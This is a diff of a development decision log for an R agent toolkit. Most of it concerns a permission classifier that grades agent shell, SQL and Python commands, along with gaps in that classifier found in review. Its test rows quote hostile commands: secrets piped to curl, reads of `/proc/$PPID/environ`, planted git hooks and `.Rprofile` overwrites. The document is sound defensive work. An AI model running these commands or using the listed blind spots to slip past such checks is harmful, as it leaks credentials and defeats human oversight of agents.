@@ -2933,7 +2933,7 @@ first added block and a third added block (4); against the round-0 source they f
 (`task1-fix1-red.log`). Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 116 ]` in the
 UTF-8 and the C locale.
 
-## D-061 - P11 command, SQL and Python classifiers are fail-safe and follow the classifier standard (level 0 is an allowlist of known read-only programs, options and literal or plain-parameter words; a construct gptr does not model is at least level 3; level 4 needs a target literal text identifies): a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords (only unquoted ones are keywords) and literal text fed to a shell or an interpreter never hide a command, program-running options and environment values are read as command lines, values the line assigns and names a lister prints are read where they are used, every directory a cd can leave the shell in is read, every write, every guarded operand of an unmodelled program, a link's source and git's working-tree paths take their path class, deleting a top-level directory is level 4, a file a command reads takes its read level, a secret with a network sink (also from ssh, scp, rsync, /dev/tcp, SQL and environment dumps) is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, SQL code channels, stored code, function-form pragmas and COPY ... PROGRAM lines are read, SQL and Python writes to literal guarded paths take their class, Python's command lines, R calls and unpickling are read, R stopped from a shell or from Python is q(), a glob can stand for any guarded name, PCRE patterns anchor with \z, sed scripts and awk programs are parsed before they are searched, a program run from a path, an unknown git subcommand and an environment variable outside an allowlist are level 3, long options are read by prefix and git remote, config and stash by verb, text enters through as_utf8() (2026-10-04)
+## D-061 - P11 command, SQL and Python classifiers are fail-safe and follow the classifier standard (level 0 is an allowlist of known read-only programs, options and literal or plain-parameter words; a construct gptr does not model is at least level 3; level 4 needs a target literal text identifies): a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords (only unquoted ones are keywords) and literal text fed to a shell or an interpreter never hide a command, program-running options and environment values are read as command lines, values the line assigns and names a lister prints are read where they are used, every directory a cd can leave the shell in is read, every write, every guarded operand of an unmodelled program, a link's source and git's working-tree paths take their path class, deleting a top-level directory is level 4, a file a command reads takes its read level, a secret with a network sink (also from ssh, scp, rsync, /dev/tcp, SQL and environment dumps) is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, SQL code channels, stored code, function-form pragmas and COPY ... PROGRAM lines are read, SQL and Python writes to literal guarded paths take their class, Python's command lines, R calls and unpickling are read, R stopped from a shell or from Python is q(), a glob can stand for any guarded name, PCRE patterns anchor with \z, sed scripts and awk programs are parsed before they are searched, a program run from a path, an unknown git subcommand and an environment variable outside an allowlist are level 3, long options are read by prefix and git remote, config and stash by verb, a guarded name below a directory the shell computes keeps its class, git commands that print files read them, environment names code computes and R's /proc environ are secret reads, ps and jq options are not inert, text enters through as_utf8() (2026-10-04)
 
 P11 Task 2 appends the plan's G5 classifiers (`risk_command()`, `risk_sql()`, `risk_python()`, the
 flag-row helpers, `risk_path_class()`, `risk_cmd_row()`, `risk_cmd_edits_parity`) with the plan's
@@ -2958,8 +2958,9 @@ read a line differently (brace expansion, a descriptor such as `10>`), both read
 classified and the higher counts; so are the Windows and the sh reading of a backslash, and the
 readings of a parameter default (round 4), and every directory a `cd` can leave the shell in
 (round 5: it may fail). Items 1-10 are the rounds 0-2 behaviour; item 11 lists what round 3
-added, item 12 what round 4 added, item 13 what round 5 added, item 14 what round 6 added and
-item 15 what round 7 (the classifier standard) added.
+added, item 12 what round 4 added, item 13 what round 5 added, item 14 what round 6 added,
+item 15 what round 7 (the classifier standard) added, item 16 what round 8 added and item 17
+what round 9 added.
 
 **The classifier standard (coordinator decision, review round 7; it wins over the wording above
 and over items 1-14 where they differ).** (A) Level 0 means *known* read-only, never "nothing
@@ -3458,7 +3459,8 @@ below 1, and SQL keeps its keyword reading (Known limits).
       one that starts with an expansion or a single `-` (`sort "$OPTS"`, `sort -r$X`,
       `find "$d"`, `git log $RANGE`, `curl "$URL"`); a long option's value after `=` is not one.
       `risk_cmd_inert` lists the read-only programs none of whose options writes, runs code or
-      changes state (cat, head, tail, ls, grep, wc, diff, du, ps, jq, echo, cd, ...), so a plain
+      changes state (cat, head, tail, ls, grep, wc, diff, du, echo, cd, ...; ps and jq until
+      round 9, item 17), so a plain
       parameter there stays 0 as (A) allows (`cat "$f"`, `wc -l "$f"`, `grep -n "$p" f.txt`,
       `ls "$DIR"`). The tokeniser gives each word attribute `expand` (0 nothing expanded, 1 a `$`
       or backtick inside double quotes, 2 one outside quotes), `risk_sh_split()` carries it, and
@@ -3642,12 +3644,82 @@ below 1, and SQL keeps its keyword reading (Known limits).
       `.curlrc`); the row's point, that the export's environment listing is no secret sent to
       the network (not 4), holds. One new expectation of mine was wrong before green:
       `sed -l 'w .x' f` is 2 (BSD sed reads `-l` without a value, so the script writes `.x`).
+17. **Review round 9 (findings against the standard).** Each finding was reproduced with a probe
+    (`task2-fix9-probe.log`) and judged by (A)-(C); three majors and one minor were accepted.
+    - *A guarded name below a directory the shell computes (C).* P01 guards `.Rprofile`,
+      `Rprofile.site`, `Renviron.site`, the `.gptr/` control files and `.git/hooks` by name in
+      any directory, so `"$D/.Rprofile"` names a control file whatever `$D` holds, as
+      `*/.Rprofile` already did; it was `unknown` (3) for writes and deletes.
+      `risk_cmd_dyn_word()` reads such a word with each component that holds an expansion
+      (`$NAME`, `${...}`, a substitution, `%NAME%`, `~login`) as one ordinary name (a run of them
+      as one, since an expansion may hold `/`; a word that starts with one as absolute), and
+      `risk_cmd_unknown_cwd()` gives the word the class P01 gives that reading by name (control,
+      protected or instructions; a `.gptr` directory is control) over `unknown`; critical, which
+      depends on where the directory is, never comes from it. Writes, deletes, links and the
+      guarded operands of unmodelled programs go through it: `echo x >> "$R_HOME/etc/Rprofile.site"`,
+      `cat > "$PROJ/.Rprofile" <<'EOF'`, `cp hook.sh "$REPO/.git/hooks/pre-commit"`,
+      `echo x > "$D/.gptr/settings.json"`, `ln -s evil "$D/.Rprofile"`, `mv x "$D"/.Rprofile`,
+      `touch $X/.Rprofile`, `echo x > .gptr/extensions/$F` and `rm -rf "$D/.gptr"` are 4, with
+      the level and category of the literal word (`x/.Rprofile`, `x/.gptr`). A glob there takes
+      the guarded names it can match, as item 15 reads a glob: `rm -rf "$D"/*` is 4 like
+      `rm -rf build/*`, and `ls "$D"/*` 2 and `cat "$D"/*` 3 `secret` like `ls x/*` and
+      `cat x/*` (`risk_cmd_read_class()`, `risk_cmd_secret_file()`); `cat "$D/renv.lock"` reads
+      a protected file (2). A bare `"$X"`, a computed last name (`"$D/$F"`), a name joined to an
+      expansion (`"$D.Rprofile"`), `"$D/.."` and an ordinary name (`"$D/notes.txt"`) keep
+      `unknown` (3 for a write or a delete; `cat "$f"` stays 0, as (A) admits).
+    - *git commands that print files.* `risk_git_shown()` gives the files whose contents git
+      prints, which the git branch reads as cat's operands (a secret file is 3 `secret`, a
+      protected file 2, a file outside the project 1): grep's operands after its pattern (paths
+      with `--no-index` or `--untracked`, else trees and the pathspecs after `--`) and its `-f`
+      file; blame's and annotate's operands and `--contents FILE`; the operands of diff,
+      diff-files, diff-index and diff-tree (round 7's `--no-index` reading is one case of it);
+      those of log, whatchanged and reflog with a patch option (`-p`, `-u`, `-c`, `-U<n>`, and
+      `--patch`, `--cc`, `--word-diff`, ... by prefix, `--color` excepted) and the file of
+      `-L<range>:<file>`; and show's and cat-file's operands, an object `REV:path` or
+      `:<stage>:path` read as `path` (`:/text` searches commit messages and names no path).
+      `git grep --no-index -h . -- .env`, `git blame .env`, `git diff -- .env`,
+      `git show HEAD:.env`, `git log -p .env`, `git show :.env` and `git cat-file blob :.env` are
+      3 (`git show HEAD:.env | curl -d @- URL` 4); `git grep -n TODO`, `git blame R/x.R`,
+      `git show HEAD:R/x.R`, `git log .env` and `git log --oneline -- .env` (names only),
+      `git log -p` and `git show ':/fix .env'` stay 0. `git annotate` is read with blame's row:
+      it had the table's default 2, so its guarded operands were writes (`git annotate .Renviron`
+      was 4 `control`, now 3 `secret`; `git annotate R/x.R` 0).
+    - *Environment names code computes, and R's environment in /proc.* `risk_code_env()` made the
+      quote of a name optional, so `ENVIRON[k]`, `ENVIRON[ARGV[1]]`,
+      `ENVIRON["OPENAI_" "API_KEY"]` and `getenv(name)` read as literal names that are no
+      secrets (0). A name in a subscript or an argument is now literal only when it is quoted and
+      ends the subscript or the argument; anything else is a computed name ("ENV", a 2 `secret`
+      read). A bare name stays literal after `process.env.`, in Perl's `$ENV{NAME}` and in
+      PowerShell's `$env:NAME`. `risk_cmd_secret_file()` reads `/proc/<pid>/environ` as a
+      secret path when the pid is an expansion or a glob (`$PPID` is R, `$$` a shell that
+      inherited R's environment): `cat /proc/$PPID/environ`,
+      `tr '\0' '\n' < /proc/$PPID/environ`, `cat /proc/${PPID}/environ` and
+      `cat /proc/*/environ` are 3 `secret` (4 with a network sink); `cat /proc/$PPID/status`
+      stays 0.
+    - *ps and jq leave `risk_cmd_inert`.* ps's `e`/`-E` print environments (2 `secret`) and jq's
+      `-f`/`-L` load code (3), so an option the shell computes for them is 3 ("not modelled: an
+      option the shell computes": `ps $X -p 1`, `ps "$X"`, `ps -p $PID` (split), `jq . $X`,
+      `jq -r . $OPT`, and `jq . "$f"`, since jq reads options anywhere). A quoted word that is
+      the separate value of an option they take (`risk_gate_values`; jq's `--arg`, `--argjson`,
+      `--slurpfile` and `--rawfile` take a name and a value) is no option: `ps -p "$pid"`,
+      `ps -fp "$pid"`, `ps -o pid= -p "$pid"`, `jq --arg x "$v" '.a' a.json` and
+      `jq --argjson n "$n" '.a' a.json` stay 0. As for any program outside the list, a prefix
+      assignment or export of a name outside `risk_env_inert_re` before them is 3 (item 16:
+      `FOO=1 jq . f.json`).
+    - *Changed rows:* none; the 179 lines of the round-7 and round-8 probes give the same levels.
 Known limits (advisory classifier, not a security boundary; each shell, Python and SQL limit
 below is level 3 or the level of what can be read, never 0, except what (A) admits and the SQL
 functions named last). (A) admits a plain parameter as an operand, and as an option of a
 program in `risk_cmd_inert` (whose options only read), so `cat "$f"` or `ls $DIR` stays 0
 whatever the variable names (a read of a computed path reads at its `unknown` class, 0). pkill
 and killall patterns are matched against a fixed list of R's process names and command lines.
+A directory the shell computes gives a word only the classes P01 gives by name in any
+directory: never critical (`rm -rf "$D/.."` is 3), nor a class P01 gives in one directory only
+(`.Renviron` is control in the project root and the home directory, so `"$D/.Renviron"` is read
+as protected, a 3 write). git grep without a path searches the work tree as `grep -r KEY .` does
+and names no file (0); a revision named like a secret file (`git log -p feature/credentials`)
+is read as one, and a secret pathspec of `git show --stat` or `git diff --stat` is read as if
+its contents were printed (3).
 Scripts read by `sed -f`/`awk -f`, `source FILE` or `sh FILE`,
 configuration read by `curl -K`, `wget -e`/`--config` (3 `dynamic` since round 4) or `git` from
 the repository, the values of variables the line does not assign literally (from the
@@ -3703,9 +3775,12 @@ those (`task2-std-red2.log`) (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1549 ]` at the 
 Review round 8 added item 16 with eight blocks (217 expectations) and one changed row; the eight
 blocks as first written (211 expectations) fail 102 against the round-7 source
 (`task2-fix8-red.log`), and the three implicit-stash rows of the self-review fail 2 before their
-fix (`task2-fix8-red-stash.log`). Final `^perm-classify$`:
-`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1766 ]` in the UTF-8 and the C locale
-(`task2-fix8-green.log`, `task2-fix8-green-C.log`).
+fix (`task2-fix8-red-stash.log`) (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1766 ]` at the end of
+round 8). Review round 9 added item 17 with four blocks (180 expectations) and no changed row;
+the blocks as first written (178 expectations) fail 115 against the round-8 source
+(`task2-fix9-red.log`). Final `^perm-classify$`:
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1946 ]` in the UTF-8 and the C locale
+(`task2-fix9-green.log`, `task2-fix9-green-C.log`).
 
 ## D-062 - P15 block headers: values holding a line break are quoted, quoted values are decoded without the R parser, header keys are matched exactly, a local model tag is kept as written (2026-10-04)
 
@@ -7070,3 +7145,270 @@ every failure in the six adaptation tests); green `[ FAIL 0 | WARN 0 | SKIP 1 | 
 (`task7-green.log`; the skip is P11's `gptr_permissions()` leg). Review round 1 (items 7-8):
 red `[ FAIL 19 | WARN 0 | SKIP 1 | PASS 475 ]` (`task7-fix1-red.log`), green
 `[ FAIL 0 | WARN 0 | SKIP 1 | PASS 494 ]` (`task7-fix1-green.log`).
+
+## D-109 - P15 deferred and pending writes: a sidecar of an earlier process with this pid is a dead one, a deferred run's lock is held together with its exit finalizer, the script this process runs under Rscript is never written before exit, a pending record forgets blocks another process synced, a kernel that cannot name its notebook treats the notebooks in its working directory as open, recovered paths are kept absolute, and the sidecar is replaced whole (2026-10-04)
+
+P15 Task 10's plan-literal deferred-write code (`R/doc-io.R`: `doc_sidecar_write()`,
+`doc_sidecar_live()`, `doc_pending_add()`, `doc_recover()`, `doc_notebook_attached()`,
+`doc_sync()`) changed in seven ways. The produced interfaces of the plan are unchanged; new
+`@noRd` helpers are `doc_sidecar_mine(rec)`, `doc_pending_reconcile(rec)`,
+`doc_script_running(path)` (`R/doc-io.R`) and `doc_rscript_running()` (`R/doc-locate.R`, now
+shared with `doc_site_rscript()`, whose behaviour is unchanged). Task 9's obligation (D-107 item
+4) is met: `doc_upsert()` dispatches `deferred` and `pending` sites to `doc_pending_add()` before
+its refusal of unknown backends.
+
+1. **A sidecar of an earlier process that had this pid is a dead one (IC-51: "unapplied upserts
+   of a dead pid").** The plan recorded the process creation time "against pid reuse" but
+   `doc_sidecar_live()` returned TRUE for any record with this pid. Containers give each run the
+   same small pid, so a killed run's sidecar was then never recovered, and the next run's first
+   deferred upsert did not adopt it and overwrote it. `doc_sidecar_mine()` compares the creation
+   time as well (without one on either side the pid decides, as before); other pids go through
+   P04's `pid_alive(pid, create_time)`.
+2. **A deferred run's lock is held together with its exit finalizer.** The plan took the run lock
+   (`doc_lock_hold()`) before preparing the block but registered the finalizer, which releases
+   it, only after a block was queued. When the first deferred block of a run was not queued
+   (call not found, a user-edited block, a `document_write` hook blocking it) the lock directory
+   outlived the process until the next touch broke it as stale. `doc_finalizer_ensure()` now runs
+   as soon as the lock is held, as `doc_recover(defer = TRUE)` already did.
+3. **The script this process runs under Rscript is never written before exit (report 14 section
+   2.1.2 items 6-7: rewriting a script Rscript is running corrupts the run; IC-51).**
+   `doc_script_running(path)` is TRUE when this process holds the document's run lock or
+   `Rscript --file=` names it (`doc_rscript_running()`, the file `doc_site_rscript()` locates
+   calls in). Then `doc_recover(path)` adopts a dead run's upserts into this run's deferred
+   writes instead of applying them now (so `gptr_doc("analysis.R")` at the top of
+   `analysis.R`, or `gptr_blocks()` inside it, does not rewrite the running script), and
+   `doc_sync(path)` adopts, prints a notice and returns 0. The plan applied both at once, and
+   `doc_sync()` also wrote this process's own queued blocks into the running script and dropped
+   them from the exit flush.
+4. **A pending record forgets blocks another R process synced (IC-50).** `gptr_doc(path, sync =
+   TRUE)` in another session applies a kernel's pending blocks and removes them from the sidecar,
+   but the kernel kept them in `the$doc_pending` and wrote them back into the sidecar with its
+   next pending block, so the next sync re-inserted an agent cell the user had deleted since (or
+   reported one the user had edited as a conflict, kept in the sidecar for good).
+   `doc_pending_reconcile()` keeps only the upserts that this process's sidecar still holds (none
+   when it is gone) before a pending block is queued or synced; a sidecar another process wrote
+   meanwhile leaves the record as it was.
+5. **A kernel that cannot name its notebook treats the notebooks in its working directory as
+   open (IC-50: gptr never writes the open notebook).** `doc_site_jupyter()` (Task 8) finds the
+   kernel's notebook by content among the notebooks of the working directory when
+   `JPY_SESSION_NAME` is unset or names no existing file (for example a path relative to the
+   Jupyter server's root rather than the kernel's directory). The plan's
+   `doc_notebook_attached()` was then always FALSE, so `gptr_doc(path, sync = TRUE)` run in that
+   kernel wrote the notebook it runs. Each notebook in the working directory now counts as
+   attached in that case; `JPY_SESSION_NAME` naming an existing file decides as before.
+6. **Recovered paths are kept absolute.** `doc_recover()` and `doc_sync()` normalise the path
+   first; the plan stored a relative path in the deferred record, which the exit flush resolved
+   against the working directory of that time (a conflict warning, the block not written, and a
+   second sidecar under the other path's key).
+7. **The sidecar is replaced whole (IC-51: "SIGTERM loses at most one call").** The plan wrote it
+   in place with `save_rds()`, so a write cut short (SIGTERM during the flush after a call, a
+   full disk) left a truncated file that `doc_sidecar_read()` reads as no sidecar: every queued
+   block was lost. `doc_sidecar_write()` now writes the same bytes (`serialize_leaf()`,
+   uncompressed and `ascii = FALSE`, byte-identical to `save_rds()`'s and read by `readRDS()`)
+   through P01's `write_atomic()` (rename with retries, in-place fallback).
+
+Not changed (recorded in `progress/P15.md`, Task 10): with array jobs the process that holds the
+run lock writes the shared script at its exit while siblings may still be running it (IC-51's
+design; on Unix the atomic rename should leave their open script on the old inode, the in-place
+fallback cannot, not verified here); a queued regeneration of a hand-edited notebook cell that
+the user agreed to is a conflict at sync (the cell may have changed again since); two kernels
+running the same notebook overwrite each other's pending sidecar.
+
+IC-74 (07 section 6, P15 row): consent is checked before anything is queued (no sidecar, no
+lock without it) and a local model's tag (`ollama/qwen3:8b`) survives the sidecar into the
+written header (new coverage test); nothing here calls a provider.
+
+Validation: `progress/P15.md`, Task 10. Eight tests added (+47 expectations; the plan's five are
+verbatim except the fixture path resolved before `local_project()`, the Task 4 trap). Against the
+plan-literal source the plan's tests pass and the added ones fail
+`[ FAIL 23 | WARN 1 | SKIP 0 | PASS 149 ]` (`dev/.validation/P15/task10-adapt-red-final.log`; the
+IC-74 test passes, coverage only); final `^doc-io$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 172 ]`
+(`task10-green.log`).
+
+## D-110 - P13 System 1 states: POSIXlt date-times give one state per element, row records read matrix, data-frame and POSIXlt columns by row, I() of a small list is sent as the list, and a piped session's state never exceeds gptr.s1_state_max (2026-10-04)
+
+P13 Task 7 (`R/s1-route.R`, `tests/testthat/test-s1-route.R`, and `s1_test_call()` restored in
+`tests/testthat/fixtures/jev/harness.R` now that P08's `call_new()` exists, 24be22b). The rest of
+the plan's code is verbatim, and its 9 tests (48 expectations) are unchanged. Four points differ
+from the plan-literal code. Each follows the batch rule of architecture 4.1.5 or contract 3.1/7.13
+("at most `gptr.s1_state_max` characters").
+
+1. **POSIXlt vectors.** A POSIXlt vector is a list underneath, so the plan's rule read it as a
+   classed list. It became one state holding a list of formatted strings, while the same times
+   as POSIXct gave one state per element. POSIXlt now counts as an atomic vector: one state per
+   element (`values[i]`), formatted like POSIXct.
+2. **Row records (`s1_cell()`).** The plan read every unclassed column with `.subset2(col, i)`.
+   That reads the wrong cell in three cases:
+   - a matrix column: element `i` in column-major order;
+   - a nested data frame: its column `i`;
+   - a POSIXlt column: its component `i` (`sec`, `min`, ...).
+
+   A two-dimensional column now gives its row `i` (`col[i, , drop = TRUE]`), so a named row is
+   a JSON object. A POSIXlt column gives element `i`, like other classed vectors. List columns,
+   `I(list(...))` included, still use `.subset2()`.
+3. **`I(list(...))`.** AsIs makes the list a classed object, so the plan sent its describer text.
+   `I(x)` only marks "exactly one state". A small `I()` list (at most 100 elements) is now sent
+   as the list, as `I()` of an atomic vector already was; a larger one is still described.
+4. **The session state cap.** The plan cut only the answer. A long status reason or value name
+   (the facts) could therefore make the state longer than `gptr.s1_state_max`. As a last step,
+   the whole state is now cut to the cap and ends in `...`. The answer is still cut first, so
+   the output is the plan's whenever the facts fit.
+
+Evidence: with the plan-literal file swapped in, `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 55 ]`. Only
+five assertions fail, all in four of the new tests (`dev/.validation/P13/task7-negative.log`).
+The final run is `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 60 ]` (`task7-green.log`).
+
+## D-112 - P09 builtin:workspace: the workspace baseline is kept in the session's live memo, shared by the block providers and the agent_end hook and never inside a plugin's persisted state; a prompt preview remembers nothing; a session without a home is labelled by the listed environment; P07's floor tests hide the skill_content block (2026-10-04)
+
+P09 Task 10's plan-literal `builtin:workspace` (`R/env-snapshot.R`) is changed in three ways.
+The block, section, evaluator, hook and service names, placements, orders and budgets, the
+provider and service signatures and the plan's 8 test blocks (`tests/testthat/test-env-snapshot.R`)
+are unchanged. The plan-literal file is kept as
+`dev/.validation/P09/task10-env-snapshot-plan-literal.R`.
+
+1. **The workspace baseline is one environment per live session, in its live record's `memo`.**
+   The plan kept it "in an environment inside `ctx$state()`" (Self-review ambiguity 7). In the
+   implemented P02/P06, `ctx$state()` is one state per extension source (`ctx_ext_label()` of the
+   ctx's `.source`). P07's `context_provide()` calls `provide(ctx, budget)` without a source, so
+   the providers get the state labelled `plugin`, which every sourceless caller (a plugin's tool,
+   for example) shares. P02's `ev_call()` runs the `agent_end` hook as `builtin:workspace`, so the
+   hook gets the state labelled `workspace`. With the plan-literal code:
+   - the hook never refreshed the baseline the providers read, so the next `<workspace_changes>`
+     reported the agent's own new objects as the user's changes;
+   - the environment stored in the shared `plugin` state made P06's `plugin_state_persist()` skip
+     that whole state (`json_encode()` fails on an environment), so another extension's
+     sourceless `ctx$state()` values were no longer persisted.
+   `env_memory()` now keeps the baseline under `gptr_workspace` in `session_live(s)$memo` (kernel
+   SDK, memory only; P06 keeps `tool_schemas` and P07 its `prompt_*` keys there). A ctx without a
+   live session uses `ctx$state()` (the plan tests' fake ctx), else a fresh environment, so
+   nothing is kept. The memory still dies with the session, and is still never persisted.
+2. **A prompt preview changes nothing.** `gptr_prompt()` renders the first message with
+   `input$preview = TRUE` (P07's `context_input()`; D-079: a preview has no side effects). The
+   plan's `env_block_workspace()` stored the snapshot and started the history log in a preview,
+   so a preview reset the baseline (the next `<workspace_changes>` lost the user's changes made
+   before it) and registered the task callback. `env_remember()` now returns at once in a
+   preview; the block text is unchanged.
+3. **A session without a home is labelled by the environment listed.** P06's `home_label()` is
+   `"<none>"` for a session without a home, whose block lists the run's environment
+   (`ctx$envir`). The `env` attribute then reads `globalenv` or `<environment>`, as for a ctx
+   without a session. Any other session label is used as the plan says.
+
+Outside P09's files, two P07 tests in `tests/testthat/test-prompt-sections.R` ("the floor counts
+the project instructions the frozen audience will be sent (IC-52)" and "cut re-injection budgets
+are recorded in gptr.frozen and survive a restore (IC-71)") assumed that no `skill_content` block
+is registered. P07's `prompt_freeze()` reserves its 10,000-token re-injection budget once the
+block exists, by design. With P09 loaded, that budget alone overruns the tests' 24,000-token
+window, so both budgets were cut to 1,904 and the withheld-instructions path no longer kept full
+budgets (8 failures). The tests now hide the block with a pass-through mock of `registry_get()`
+(`local_no_skill_block()`), which restores their premise; their expectations and P07's code are
+unchanged.
+
+Validation: `progress/P09.md`, Task 10. Against the plan-literal source, the added blocks give
+`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 134 ]` (`task10-red-adaptations.log`). The real session's
+`plugin` state holds an environment, `<workspace_changes>` lists `made_by_agent` after
+`agent_end`, a preview registers the history callback and stores a snapshot, and the label is
+`"<none>"`.
+
+## D-111 - Hosted CI after the prompt, adapter and gateway waves: file extensions are read without basename() in every locale and on every R, path_norm() expands ~ before it turns backslashes into slashes, every file is checked out without line-end conversion, and Windows runs the non-ASCII name tests in its UTF-8 locale (2026-10-04)
+
+Hosted runs 37262066260 (`0398aee`), 37266727707 (`bdf7c18`) and the completed jobs of
+37269169488 (`01e13a5`) failed every R CMD check job on R 4.6.1, devel and Windows, and the
+connections job. CI Task CI-5 fixes them. Four of its changes go beyond a single test:
+
+1. **File extensions are read by `path_ext()` and `path_sans_ext()`** (`R/utils-paths.R`, P01;
+   IC-62). R 4.6 changed `tools::file_ext()` and `tools::file_path_sans_ext()` to test the
+   extension on `basename(x)`, and `basename()` translates to the native encoding, so it stops on
+   a marked UTF-8 non-ASCII path in a non-UTF-8 locale ("unable to translate 'caf<U+00E9>.r' to
+   native encoding"). D-057 item 1 had removed gptr's own `basename()` calls from the search
+   tools for this reason, but `find_relevance()` still called `tools::file_path_sans_ext()`, so
+   every relevance sort that met a non-ASCII name failed again on R 4.6 (hosted
+   `test-tool-search.R:223` on Ubuntu release, devel, LC_ALL=C, no-Suggests, macOS and the
+   connections job). The read tool's `read_token_class()` and `read_binary_text()` called
+   `tools::file_ext()` on the absolute path, so reading `caf\u00e9.R` or `caf\u00e9.rds` failed the same
+   way (no hosted test covered it; reproduced with the R 4.6 bodies). The helpers keep R 4.6's
+   rule without translating: the extension is the alphanumeric run after the last dot of the
+   last component, with at least one character that is not a dot before that dot; "/" and "\\"
+   separate components. Two differences from `tools`: the alphanumeric class is ASCII in every
+   locale (R's TRE class also counts letters such as U+00E9 in a UTF-8 locale), and on R 4.5 and
+   earlier the rule is R 4.6's, not the older one (`tools::file_ext(".Rprofile")` was
+   `"Rprofile"` there, `path_ext()` gives `""`, as R 4.6 does). The relevance classes of IC-71
+   and the read tool's estimator classes change only for such names. `R/doc-io.R:63` (P15, in
+   flight) and `R/ext-specs.R:1330` (P17) still call `tools::file_ext()`; see the open items of
+   `progress/ci-hosted.md`, Task CI-5.
+2. **`path_norm()` expands `~` before it turns backslashes into slashes** (`R/utils-paths.R`,
+   P01; IC-63). It converted first, so a home with backslashes stayed in the result, and on
+   Windows a home of the form `C:\...` was not absolute and was joined to the working directory.
+   The real `user_home()` already returns forward slashes, so nothing changes for it; the hosted
+   Windows failures (`test-ext-plugins.R:481`, `test-skill-discover.R:295-297`) came from tests
+   that mock `user_home()` with `withr::local_tempdir()`, whose path has backslashes on
+   Windows. `path_norm()` now gives forward slashes whatever `user_home()` returns.
+3. **Every file is checked out byte for byte** (`.gitattributes`: `* -text`). The Windows
+   runners set `core.autocrlf=true`, so `actions/checkout` wrote every LF text file with CRLF:
+   the document fixtures stopped parsing and round-tripping (15 failures in
+   `test-doc-formats.R`) and the shipped risk tables held CR bytes (`test-perm-classify.R:19`).
+   With the attribute unset, git converts no line ends on checkout or check-in, so the three
+   fixtures that hold CRLF on purpose keep it, and no file is renormalised. R CMD build leaves
+   `.gitattributes` out of the tarball by itself (`tools:::.hidden_file_exclusions`, R 4.2 and
+   later), so the package is unchanged.
+4. **On Windows the non-ASCII name tests keep R's UTF-8 locale** (`local_name_locale()`,
+   `tests/testthat/helper-locale.R`; amends D-057's "in any locale"). Windows R translates every
+   path it hands the file system to the native encoding, which in a C locale cannot hold a
+   non-ASCII name, so R itself cannot list or open `caf\u00e9.R` there (hosted Windows release and
+   oldrel-4: `list.files()` warned "unable to translate ... to native encoding", `ls` gave
+   "(empty directory)" and `grep` "No matches found"). No pure-R product change can do better.
+   On macOS and Linux the tests still run in the C locale; on Windows they run in R's own
+   locale, which is UTF-8 on R 4.2 and later (they skip if it is not).
+
+Validation: `progress/ci-hosted.md`, Task CI-5.
+
+## D-113 - P08 gateway closure: an empty argument is refused before any dot is read, routing follows the model-level type so a decision-only model without the classifier route is not_available instead of an internal error, and the gptr export and its methods reach NAMESPACE and man/ only when the gateway can run its examples (2026-10-04)
+
+P08 Task 8's plan-literal `R/gptr-gateway.R` (`gptr()`, `gateway_dispatch()` and the
+`gptr_gateway` methods) changed in two ways, and one plan step is deferred. The plan's 20 tests
+are verbatim except for the once-key reset of the alias test (Task 6's obligation).
+
+1. **An empty argument is refused** (Task 5's obligation, D-102 item 7). `gptr("x", , big)`,
+   `gptr("x", )` and a forwarded `w("x", , big)` reached `dot_is_literal(exprs[[i]])` and failed
+   with R's `argument is missing, with no default`. The new leaf `dot_empty(exprs)` reads each
+   dot expression by index (never binding it to a local, like `dot_sites()`), and `gptr()`
+   refuses an empty one before any dot is read: `gptr_error_invalid_argument`, `arg = "..."`,
+   message `Argument <i> of the dots is empty.` (no value is echoed). A named formal written
+   empty (`model = `) is R's missing argument and keeps its default, as before.
+2. **Routing follows the model-level type** (IC-74; 07-local-ollama.md section 2: "P13 must not
+   reject Clef because the parent `ollama` provider defaults to chat; both P08 routing and P13
+   dispatch use the resolved model"; the coordinator's note: a decision-only classifier model
+   routes to System 1, never to chat). The new `gateway_model_type(model)` gives the model-level
+   `type` of a call's resolved model through P05's pure `model_resolve(ref, strict = FALSE)`:
+   `ollama/clef-flash` and `ollama/clef` are `"classifier"` although `ollama` serves chat,
+   `ollama/qwen3:1.7b` is `"chat"`, `jev` is `"classifier"`, a provider spec gives its first
+   model's type (else its own), a router spec, a registered router name or `router:<name>` is
+   `"router"`, and `NULL` (the configured default), an unresolved reference or a malformed value
+   is NA. It never discovers, prepares or refreshes (07 section 2.1) and never signals, so a
+   route's `match()` may call it. When no route handled a call that has a prompt and a
+   classifier model, `gateway_dispatch()` now signals `gptr_error_not_available` (`member =
+   "route:classifier"`, `provided_by = "builtin:system1"`, the message says the model is
+   decision-only) instead of the plan's `gptr_error_internal` ("No gateway route handled this
+   call"), so such a call is never left to a conversational route. **Task 9's `nested`,
+   `continue` and `new` routes decline a model whose `gateway_model_type()` is `"classifier"`**
+   (P13's `classifier` route at order 10 takes it first when loaded); the test "without the
+   classifier route a decision-only model is not_available (IC-74)" fails if `new` takes it.
+3. **NAMESPACE and `man/gptr.Rd` are not generated in this task** (the plan generates them in
+   Task 12; Tasks 2 and 7 took their exports early). The roxygen tags are in the source, and the
+   document action in a scratch copy produces `export(gptr)`, six `S3method(..., gptr_gateway)`
+   lines (`$`, `$<-`, `[[`, `[[<-`, `print`, `utils::.DollarNames`) and `man/gptr.Rd`. Taking
+   them now would make R CMD check run the `gptr()` example and the six `@examplesIf
+   exists("gptr", mode = "function")` examples of P06 and P13 (`gptr_last()`, the session
+   store, budget and object pages, `s1-types.R`) against a gateway without routes ("No gateway
+   route handled this call", an example ERROR until Task 9), and `man/gptr.Rd` links
